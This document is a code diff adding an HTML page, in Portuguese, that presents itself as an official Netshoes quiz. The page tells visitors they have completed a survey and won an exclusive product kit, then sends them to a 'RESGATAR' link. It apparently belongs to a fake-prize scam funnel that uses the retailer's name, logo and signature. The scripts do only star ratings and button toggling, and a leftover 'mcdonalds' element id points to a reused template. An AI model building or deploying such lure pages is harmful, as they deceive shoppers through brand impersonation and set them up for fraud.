@@ -1,0 +1,286 @@
+<!DOCTYPE html><html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+    <title>Netshoes | Quiz oficial</title>
+    <link rel="apple-touch-icon" sizes="180x180" href="images/logo_1.png">
+    <link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
+    <script async="" src="js/fbevents.js"></script><script src="js/jquery.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="js/script.js"></script>
+    <script src="js/021532d534.js" crossorigin="anonymous"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        let cardGradeButtons = document.querySelectorAll(".card__grade");
+        let resposta1Buttons = document.querySelectorAll(".resposta1");
+        let resposta2Buttons = document.querySelectorAll(".resposta2");
+  
+        cardGradeButtons.forEach(function (button) {
+          button.addEventListener("click", function () {
+            toggleButton(this, cardGradeButtons);
+            checkConditions();
+          });
+        });
+  
+        resposta1Buttons.forEach(function (button) {
+          button.addEventListener("click", function () {
+            toggleButton(this, resposta1Buttons);
+            checkConditions();
+          });
+        });
+  
+        resposta2Buttons.forEach(function (button) {
+          button.addEventListener("click", function () {
+            toggleButton(this, resposta2Buttons);
+            checkConditions();
+          });
+        });
+  
+        function toggleButton(clickedButton, buttons) {
+          buttons.forEach(function (btn) {
+            btn.classList.remove("active");
+          });
+  
+          clickedButton.classList.add("active");
+        }
+  
+        function checkConditions() {
+          const enviarRespostaButton =
+            document.getElementById("enviarResposta");
+          const resposta1Active = document.querySelector(".resposta1.active");
+          const resposta2Active = document.querySelector(".resposta2.active");
+  
+          // Verifica se algum input do tipo radio está selecionado
+          const radios = document.querySelectorAll('input[type="radio"]');
+          let radioSelected = false;
+          radios.forEach((radio) => {
+            if (radio.checked) {
+              radioSelected = true;
+            }
+          });
+  
+          if (
+            enviarRespostaButton &&
+            resposta1Active &&
+            resposta2Active &&
+            radioSelected
+          ) {
+            // Ativa o botão se todas as condições são atendidas
+            enviarRespostaButton.removeAttribute("disabled");
+            enviarRespostaButton.classList.add("active");
+          } else {
+            // Desativa o botão se alguma condição não for atendida
+            enviarRespostaButton.setAttribute("disabled", "true");
+          }
+        }
+      });
+  
+      function toggleResponse(clickedElement, group) {
+        // Obtém todos os elementos do mesmo grupo
+        const groupElements = document.querySelectorAll(`.${group}`);
+  
+        // Remove a classe 'active' de todos os elementos do mesmo grupo
+        groupElements.forEach((element) => {
+          element.classList.remove("active");
+        });
+  
+        // Adiciona a classe 'active' apenas ao elemento clicado
+        clickedElement.classList.add("active");
+      }
+  
+      document.addEventListener("DOMContentLoaded", function () {
+        let cardGradeButtons = document.querySelectorAll(".card__grade");
+        let resposta1Buttons = document.querySelectorAll(".resposta1");
+        let resposta2Buttons = document.querySelectorAll(".resposta2");
+  
+        cardGradeButtons.forEach(function (button) {
+          button.addEventListener("click", function () {
+            toggleButton(this, cardGradeButtons);
+            checkConditions();
+          });
+        });
+  
+        resposta1Buttons.forEach(function (button) {
+          button.addEventListener("click", function () {
+            toggleButton(this, resposta1Buttons);
+            checkConditions();
+          });
+        });
+  
+        resposta2Buttons.forEach(function (button) {
+          button.addEventListener("click", function () {
+            toggleButton(this, resposta2Buttons);
+            checkConditions();
+          });
+        });
+  
+        function toggleButton(clickedButton, buttons) {
+          buttons.forEach(function (btn) {
+            btn.classList.remove("active");
+          });
+  
+          clickedButton.classList.add("active");
+        }
+  
+        function checkConditions() {
+          const enviarRespostaButton =
+            document.getElementById("enviarResposta");
+          const resposta1Active = document.querySelector(".resposta1.active");
+          const resposta2Active = document.querySelector(".resposta2.active");
+  
+          // Verifica se algum input do tipo radio está selecionado
+          const radios = document.querySelectorAll('input[type="radio"]');
+          let radioSelected = false;
+          radios.forEach((radio) => {
+            if (radio.checked) {
+              radioSelected = true;
+            }
+          });
+  
+          if (
+            enviarRespostaButton &&
+            resposta1Active &&
+            resposta2Active &&
+            radioSelected
+          ) {
+            // Ativa o botão se todas as condições são atendidas
+            enviarRespostaButton.removeAttribute("disabled");
+            enviarRespostaButton.classList.add("active");
+          } else {
+            // Desativa o botão se alguma condição não for atendida
+            enviarRespostaButton.setAttribute("disabled", "true");
+          }
+        }
+      });
+  
+      $(document).ready(function () {
+        console.log("hads");
+        $("#inicio").click(function () {
+          console.log("hads");
+          $("#primeiro").css("display", "none");
+          $("#mcdonalds").css("display", "block");
+        });
+      });
+  
+      function toggleCard(clickedElement) {
+        const allCards = document.querySelectorAll(".card__grade");
+  
+        allCards.forEach((card) => {
+          card.classList.remove("active");
+        });
+        console.log(clickedElement.id);
+        // Adicione um switch para lidar com diferentes ações
+        switch (clickedElement.id) {
+          case "card__grade1":
+            updateStars("star1", "fa-solid fa-star active", "#ffd700");
+            updateStars("star2", "fa-regular fa-star", "#7e7e7e");
+            updateStars("star3", "fa-regular fa-star", "#7e7e7e");
+            updateStars("star4", "fa-regular fa-star", "#7e7e7e");
+            updateStars("star5", "fa-regular fa-star", "#7e7e7e");
+            break;
+          case "card__grade2":
+            updateStars("star1", "fa-solid fa-star active", "#ffd700");
+            updateStars("star2", "fa-solid fa-star active", "#ffd700");
+            updateStars("star3", "fa-regular fa-star", "#7e7e7e");
+            updateStars("star4", "fa-regular fa-star", "#7e7e7e");
+            updateStars("star5", "fa-regular fa-star", "#7e7e7e");
+            break;
+          case "card__grade3":
+            updateStars("star1", "fa-solid fa-star active", "#ffd700");
+            updateStars("star2", "fa-solid fa-star active", "#ffd700");
+            updateStars("star3", "fa-solid fa-star active", "#ffd700");
+            updateStars("star4", "fa-regular fa-star", "#7e7e7e");
+            updateStars("star5", "fa-regular fa-star", "#7e7e7e");
+            break;
+          case "card__grade4":
+            updateStars("star1", "fa-solid fa-star active", "#ffd700");
+            updateStars("star2", "fa-solid fa-star active", "#ffd700");
+            updateStars("star3", "fa-solid fa-star active", "#ffd700");
+            updateStars("star4", "fa-solid fa-star active", "#ffd700");
+            updateStars("star5", "fa-regular fa-star", "#7e7e7e");
+            break;
+          case "card__grade5":
+            updateStars("star1", "fa-solid fa-star active", "#ffd700");
+            updateStars("star2", "fa-solid fa-star active", "#ffd700");
+            updateStars("star3", "fa-solid fa-star active", "#ffd700");
+            updateStars("star4", "fa-solid fa-star active", "#ffd700");
+            updateStars("star5", "fa-solid fa-star active", "#ffd700");
+            break;
+          // Adicione mais casos conforme necessário
+          default:
+            // Ação padrão, se nenhum caso corresponder
+            console.log("Nenhum caso correspondente");
+        }
+      }
+  
+      function updateStars(elementId, className, color) {
+        const starElement = document.getElementById(elementId);
+        if (starElement) {
+          console.log(color);
+          starElement.className = className;
+          starElement.style.color = color; // Adiciona a cor amarela
+        } else {
+          console.error("Elemento não encontrado com ID: " + elementId);
+        }
+      }
+  
+      // Adicione um evento de clique aos elementos que deseja controlar
+      const cards = document.querySelectorAll(".card__grade");
+  
+      cards.forEach((card) => {
+        card.addEventListener("click", function () {
+          toggleCard(this); // "this" se refere ao elemento clicado
+        });
+      });
+    </script>
+  </head>
+  <body>
+    <header>
+      <i class="fa-solid fa-bars" style="color: white"></i>
+      <img src="images/logo.png" alt="">
+    </header>
+    <div class="popup__progress ativo">
+      <div class="popup__progress-item popup__progress-item_active">🗸</div>
+      <div class="popup__progress-line"></div>
+      <div class="popup__progress-item popup__progress-item_active">🗸</div>
+      <div class="popup__progress-line"></div>
+      <div class="popup__progress-item popup__progress-item_active">🗸</div>
+      <div class="popup__progress-line"></div>
+      <div class="popup__progress-item">🎉</div>
+    </div>
+    <main>
+        <div class="card finalizacao" id="finalizacao">
+            <div class="finalizacao__titulo">
+              <h1 style="color: black">PARABÉNS!</h1>
+            </div>
+            <img src="images/video.gif" style="width: 100%" alt="Imagem da Pandora Box">
+            <p style="font-size: 14px; font-weight: 400; margin-bottom: 10px">
+              Parabéns por concluir nossa pesquisa Netshoes!
+              Como agradecimento e recompensa, <span style="font-weight: bold"> você ganhou um Kit Exclusivo de Produtos Netshoes!</span>
+              Clique no botão <span style="font-weight: bold">RESGATAR </span> abaixo para resgatar seu prêmio.
+      
+            </p>
+            <p style="font-size: 13px; font-weight: 400; margin-bottom: 10px">
+              Agradecemos sua participação e esperamos que desfrute do seu prêmio.
+            </p>
+            <p style="
+                font-size: 14px;
+                font-weight: 400;
+                margin-bottom: 0px;
+                margin-top: 20px;
+              ">
+              Com carinho, <span style="font-weight: bold">Equipe Netshoes</span>
+            </p>
+      
+            <div class="openModal" style="margin-top: 10px">
+              <a href="produtos.html">
+                <button style="color: white; background-color: black" onclick="window.location.href='/produtos'">
+                        <i class="fa-solid fa-gift"></i>RESGATAR
+                      </button>
+              </a>
+    </main>
+    <script src="js/jquery-3.2.1.slim.min.js" crossorigin="anonymous"></script>
+    <script src="js/popper.min.js" crossorigin="anonymous"></script>
+    <script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+  
+  </body></html>
